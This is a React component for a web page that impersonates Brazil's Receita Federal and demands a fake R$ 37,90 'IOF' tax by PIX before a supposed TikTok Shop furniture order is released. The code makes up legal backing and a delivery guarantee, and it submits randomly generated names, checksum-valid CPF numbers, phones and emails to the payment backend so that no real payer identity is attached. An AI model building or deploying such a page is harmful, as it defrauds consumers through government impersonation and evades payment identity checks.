import { useState, useEffect, useRef } from "react";
import { Copy, Check, X, AlertTriangle, CheckCircle2, AlertCircle, Info } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { supabase } from "@/integrations/supabase/client";

const generateRandomCPF = () => {
  const rand = (n: number) => Math.floor(Math.random() * n);
  const n = Array.from({ length: 9 }, () => rand(9));
  const d1 = (n.reduce((s, v, i) => s + v * (10 - i), 0) * 10) % 11 % 10;
  n.push(d1);
  const d2 = (n.reduce((s, v, i) => s + v * (11 - i), 0) * 10) % 11 % 10;
  n.push(d2);
  return n.join("");
};

const generateRandomPhone = () => {
  const ddd = [11, 21, 31, 41, 51, 61, 71, 81, 85, 92][Math.floor(Math.random() * 10)];
  const num = Math.floor(Math.random() * 900000000) + 100000000;
  return `${ddd}9${num.toString().slice(0, 8)}`;
};

const generateRandomName = () => {
  const first = ["Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Patricia", "Roberto", "Juliana", "Pedro"];
  const last = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Pereira", "Costa", "Almeida", "Ferreira", "Ribeiro"];
  return `${first[Math.floor(Math.random() * first.length)]} ${last[Math.floor(Math.random() * last.length)]}`;
};

const IOF_AMOUNT_CENTS = 3790; // R$ 37,90
const ORDER_AMOUNT_LABEL = "R$ 64,20";

const ShippingNotice = () => {
  const [agreed, setAgreed] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState("");
  const [externalRef, setExternalRef] = useState("");
  const [paid, setPaid] = useState(false);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Poll for payment status
  useEffect(() => {
    if (!externalRef || !showPopup) {
      if (pollingRef.current) clearInterval(pollingRef.current);
      return;
    }
    pollingRef.current = setInterval(async () => {
      try {
        const { data } = await supabase.functions.invoke("check-pix-status", {
          body: { externalRef },
        });
        if (data?.status === "paid") {
          if (pollingRef.current) clearInterval(pollingRef.current);
          setPaid(true);
          setTimeout(() => {
            window.location.href = '/nfe';
          }, 2500);
        }
      } catch (e) {
        console.error("Poll error:", e);
      }
    }, 5000);
    return () => { if (pollingRef.current) clearInterval(pollingRef.current); };
  }, [externalRef, showPopup]);

  const handlePay = async () => {
    if (!agreed) return;
    setShowPopup(true);
    setLoading(true);
    setError("");
    setPixData(null);
    setCopied(false);
    setPaid(false);

    const randomName = generateRandomName();
    const randomCpf = generateRandomCPF();
    const randomPhone = generateRandomPhone();
    const randomEmail = `${randomName.toLowerCase().replace(/\s/g, ".")}${Math.floor(Math.random() * 999)}@gmail.com`;

    try {
      const { data, error: fnError } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          color: "branca",
          amount: IOF_AMOUNT_CENTS,
          product_type: 'envioup',
          customer: {
            name: randomName,
            email: randomEmail,
            phone: randomPhone,
            document: { number: randomCpf, type: "cpf" },
          },
          shipping: {
            street: "Rua Fiscal",
            number: "1",
            complement: "",
            neighborhood: "Centro",
            city: "São Paulo",
            state: "SP",
            zipCode: "01001000",
          },
        },
      });

      if (fnError) throw new Error(fnError.message);
      if (!data?.success) throw new Error(data?.error || "Erro ao gerar pagamento");
      setPixData(data.data);
      setExternalRef(data.data?.externalRef || data.data?.external_ref || "");
    } catch (e: any) {
      console.error("PIX generation error:", e);
      setError(e.message || "Erro ao gerar pagamento.");
    } finally {
      setLoading(false);
    }
  };

  const pixCode = pixData?.pixCode || pixData?.pix_code || pixData?.qrcode || pixData?.paymentData?.copyPaste || pixData?.paymentData?.qrCode || "";
  const qrBase64 = pixData?.qrCodeBase64 || pixData?.qr_code_base64 || pixData?.paymentData?.qrCodeBase64 || "";
  const qrUrl = qrBase64 ? (qrBase64.startsWith("data:") ? qrBase64 : qrBase64.startsWith("http") ? qrBase64 : `data:image/png;base64,${qrBase64}`) : "";

  const handleCopy = () => {
    if (pixCode) {
      navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: "'Inter', system-ui, -apple-system, sans-serif" }}>
      {/* Header — Receita Federal navy */}
      <header className="bg-[#0a2756] py-5 px-4 flex items-center justify-center">
        <div className="flex items-center gap-2">
          {/* Receita Federal style mark */}
          <svg viewBox="0 0 40 40" className="h-7 w-7 text-white" fill="currentColor">
            <path d="M20 4 L34 12 L34 24 C34 31 28 36 20 36 C12 36 6 31 6 24 L6 12 Z" opacity="0.95"/>
            <path d="M14 18 L20 14 L26 18 L26 26 L20 30 L14 26 Z" fill="#0a2756"/>
          </svg>
          <span className="text-white font-bold text-lg tracking-tight">Receita Federal</span>
        </div>
      </header>

      <main className="max-w-md mx-auto px-4 pt-5 pb-10">
        {/* Yellow alert banner */}
        <div className="border border-amber-300 bg-amber-50 rounded-lg px-4 py-3 mb-6 flex items-start gap-2">
          <AlertTriangle className="h-4 w-4 text-amber-600 shrink-0 mt-0.5" strokeWidth={2.5} />
          <p className="text-[14px] text-amber-700 font-semibold leading-snug">
            Imposto (IOF) obrigatório para o Tiktok Shop
          </p>
        </div>

        {/* Title */}
        <h1 className="text-[26px] font-extrabold text-gray-900 leading-tight mb-3">
          Imposto sobre Operações Financeiras (IOF)
        </h1>
        <p className="text-[15px] text-gray-600 leading-relaxed mb-5">
          O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo Banco Central do Brasil (Lei nº 8.894/94)
        </p>
        <p className="text-[15px] text-red-600 font-semibold leading-relaxed mb-6">
          <span className="text-red-600">*</span> É necessário realizar o pagamento do IOF para o pedido não ser interrompido pela Receita Federal.
        </p>

        {/* Resumo card */}
        <section className="border border-gray-200 rounded-xl overflow-hidden mb-4 bg-white">
          <div className="px-5 py-3.5 border-b border-gray-200">
            <h2 className="font-bold text-gray-900 text-[15px]">Resumo</h2>
          </div>
          <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center">
            <span className="text-[15px] text-gray-700">Valor do<br/>Pedido</span>
            <span className="text-[15px] font-semibold text-gray-900">{ORDER_AMOUNT_LABEL}</span>
          </div>
          <div className="px-5 py-4 border-b border-gray-200">
            <div className="flex justify-between items-center">
              <span className="text-[15px] font-semibold text-gray-900">Valor a ser pago (IOF)</span>
              <span className="text-[15px] font-bold text-red-600">- R$ 37,90</span>
            </div>
            <p className="text-[13px] text-red-600 mt-1">Imposto sobre Operações Financeiras</p>
          </div>
          <div className="px-5 py-4">
            <p className="text-center text-[15px] font-bold text-gray-900 mb-2 leading-snug">
              Após o pagamento<br/>estará liberado<br/>o seu pedido.
            </p>
            <div className="flex items-start gap-2 mt-3">
              <Info className="h-4 w-4 text-gray-400 shrink-0 mt-0.5" />
              <p className="text-[13px] text-gray-500 leading-snug">
                O seu pedido do Armário HomeFlex será enviado imediatamente após o pagamento do IOF.
              </p>
            </div>
          </div>
        </section>

        {/* Garantia card */}
        <section className="border border-gray-200 rounded-xl px-5 py-4 mb-4 bg-white">
          <div className="flex items-center gap-2 mb-2">
            <CheckCircle2 className="h-5 w-5 text-green-600" strokeWidth={2.5} />
            <h3 className="font-bold text-gray-900 text-[15px]">Garantia de<br/>recebimento</h3>
          </div>
          <p className="text-[14px] text-gray-600 leading-snug">
            Após do pagamento do IOF a Receita Federal garante o envio do seu produto.
          </p>
        </section>

        {/* Método de pagamento */}
        <section className="border border-gray-200 rounded-xl px-5 py-4 mb-5 bg-white">
          <h3 className="font-bold text-gray-900 text-[15px] mb-3">Método de pagamento</h3>
          <div className="flex items-center gap-2 mb-3">
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-md border border-gray-200">
              <svg viewBox="0 0 32 32" className="h-5 w-5">
                <path fill="#32BCAD" d="M22.4 24.7c-1 0-2-.4-2.7-1.1l-3.9-3.9c-.3-.3-.8-.3-1 0L11 23.6c-.7.7-1.7 1.1-2.7 1.1H7.5l4.9 4.9c1.5 1.5 4 1.5 5.6 0l4.9-4.9h-.5zM8.3 7.3c1 0 2 .4 2.7 1.1l3.9 3.9c.3.3.8.3 1 0L19.7 8.4c.7-.7 1.7-1.1 2.7-1.1h.5L18 2.4c-1.5-1.5-4-1.5-5.6 0L7.5 7.3h.8z"/>
                <path fill="#32BCAD" d="M29.6 13.2 26.7 10.3c-.1.1-.2.1-.3.1h-3.9c-.7 0-1.4.3-1.9.8l-3.9 3.9c-.4.4-.9.5-1.4.5s-1-.2-1.4-.5l-3.9-3.9c-.5-.5-1.2-.8-1.9-.8H4.3c-.1 0-.2 0-.3-.1L1.4 13.2c-1.5 1.5-1.5 4 0 5.6l2.6 2.6c.1-.1.2-.1.3-.1h4.7c.7 0 1.4-.3 1.9-.8l3.9-3.9c.7-.7 2-.7 2.8 0l3.9 3.9c.5.5 1.2.8 1.9.8h4.7c.1 0 .2 0 .3.1l2.6-2.6c1.5-1.5 1.5-4 0-5.6z"/>
              </svg>
              <span className="text-[13px] font-bold text-gray-700">PIX</span>
            </div>
          </div>
          <div className="flex items-start gap-2">
            <AlertCircle className="h-4 w-4 text-amber-600 shrink-0 mt-0.5" />
            <p className="text-[13px] text-gray-600 leading-snug">
              Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.
            </p>
          </div>
        </section>

        {/* Agreement checkbox */}
        <label className="flex items-start gap-3 mb-5 cursor-pointer select-none">
          <input
            type="checkbox"
            checked={agreed}
            onChange={(e) => setAgreed(e.target.checked)}
            className="mt-0.5 h-4 w-4 rounded border-gray-300 accent-[#0a2756]"
          />
          <span className="text-[13px] text-gray-600 leading-snug">
            Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o pedido em conformidade com as regulamentações vigentes.
          </span>
        </label>

        {/* Pay button */}
        <button
          onClick={handlePay}
          disabled={!agreed}
          className={`w-full font-bold py-4 rounded-lg text-[15px] transition-colors ${
            agreed
              ? "bg-[#0a2756] text-white hover:bg-[#0d3573] active:scale-[0.99]"
              : "bg-gray-200 text-gray-400 cursor-not-allowed"
          }`}
        >
          Pagar Imposto
        </button>
      </main>

      {/* PIX Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-4">
          <div className="bg-white rounded-2xl w-full max-w-sm shadow-2xl overflow-hidden animate-in fade-in zoom-in-95 duration-200 max-h-[90vh] overflow-y-auto">
            {/* Popup header */}
            <div className="flex items-center justify-between px-5 pt-5 pb-3 border-b border-gray-100">
              <div>
                <p className="text-[15px] font-bold text-gray-900">IOF — Armário HomeFlex</p>
                <p className="text-xs text-gray-500">Pagamento via PIX</p>
              </div>
              <button onClick={() => setShowPopup(false)} className="p-1.5 rounded-full hover:bg-gray-100 transition-colors">
                <X className="h-5 w-5 text-gray-400" />
              </button>
            </div>

            <div className="px-5 py-5">
              {loading && (
                <div className="flex flex-col items-center py-10">
                  <div className="h-10 w-10 border-4 border-gray-200 border-t-[#0a2756] rounded-full animate-spin mb-3" />
                  <p className="text-sm font-semibold text-gray-700">Gerando pagamento PIX...</p>
                  <p className="text-xs text-gray-500 mt-1">Aguarde alguns segundos</p>
                </div>
              )}

              {error && !loading && (
                <div className="text-center py-6">
                  <div className="h-12 w-12 rounded-full bg-red-100 flex items-center justify-center mx-auto mb-3">
                    <AlertTriangle className="h-6 w-6 text-red-600" />
                  </div>
                  <h4 className="font-bold text-gray-900 mb-1">Erro ao gerar pagamento</h4>
                  <p className="text-sm text-gray-500 mb-4">Não foi possível gerar o PIX. Tente novamente.</p>
                  <button
                    onClick={() => setShowPopup(false)}
                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-lg text-sm"
                  >
                    Fechar
                  </button>
                </div>
              )}

              {paid && (
                <div className="text-center py-6">
                  <div className="h-14 w-14 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-3">
                    <Check className="h-8 w-8 text-green-600" strokeWidth={3} />
                  </div>
                  <h4 className="font-bold text-gray-900 mb-1">Pagamento Confirmado!</h4>
                  <p className="text-sm text-gray-500">Seu IOF foi processado. Você será redirecionado em segundos...</p>
                </div>
              )}

              {pixData && !loading && !paid && !error && (
                <>
                  <div className="text-center mb-4">
                    <p className="text-xs text-gray-500 mb-1">Valor a pagar</p>
                    <p className="text-3xl font-extrabold text-[#0a2756]">R$ 37,90</p>
                  </div>

                  <p className="text-center text-[13px] text-gray-600 mb-3">
                    Escaneie o QR Code com o app do seu banco
                  </p>

                  {/* QR Code */}
                  <div className="flex justify-center mb-4">
                    {qrUrl ? (
                      <img src={qrUrl} alt="QR Code PIX" className="w-44 h-44 rounded-lg border border-gray-200" />
                    ) : pixCode ? (
                      <div className="p-2 border border-gray-200 rounded-lg">
                        <QRCodeSVG value={pixCode} size={176} />
                      </div>
                    ) : null}
                  </div>

                  <div className="flex items-center gap-3 my-4">
                    <div className="flex-1 h-px bg-gray-200" />
                    <span className="text-[11px] font-bold text-gray-400 tracking-wider">OU COPIE O CÓDIGO</span>
                    <div className="flex-1 h-px bg-gray-200" />
                  </div>

                  {pixCode && (
                    <div className="bg-gray-50 border border-gray-200 rounded-lg px-3 py-2.5 mb-3">
                      <p className="text-[10px] text-gray-400 font-semibold mb-1">PIX Copia e Cola</p>
                      <p className="text-[11px] text-gray-700 font-mono break-all leading-relaxed">
                        {pixCode.length > 80 ? pixCode.slice(0, 80) + "..." : pixCode}
                      </p>
                    </div>
                  )}

                  <button
                    onClick={handleCopy}
                    className={`w-full flex items-center justify-center gap-2 rounded-lg py-3.5 text-sm font-bold transition-all ${
                      copied
                        ? "bg-green-500 text-white"
                        : "bg-[#0a2756] text-white hover:bg-[#0d3573] active:scale-[0.98]"
                    }`}
                  >
                    {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    {copied ? "Copiado!" : "📋 Copiar código PIX"}
                  </button>

                  <div className="flex items-center justify-center gap-1.5 mt-3 mb-4">
                    <div className="h-2 w-2 rounded-full bg-amber-500 animate-pulse" />
                    <span className="text-[12px] text-amber-600 font-medium">Aguardando pagamento...</span>
                  </div>

                  <div className="bg-blue-50 border border-blue-100 rounded-lg p-3 mt-3">
                    <p className="text-[12px] font-bold text-gray-800 mb-2">Como pagar:</p>
                    <ol className="text-[12px] text-gray-700 space-y-1 leading-snug list-decimal pl-4">
                      <li>Abra o app do seu banco</li>
                      <li>Vá em <strong>PIX → Pagar com QR Code</strong> ou cole o código</li>
                      <li>Confirme o valor de <strong>R$ 37,90</strong></li>
                      <li>Pronto! O pagamento é processado em segundos.</li>
                    </ol>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ShippingNotice;
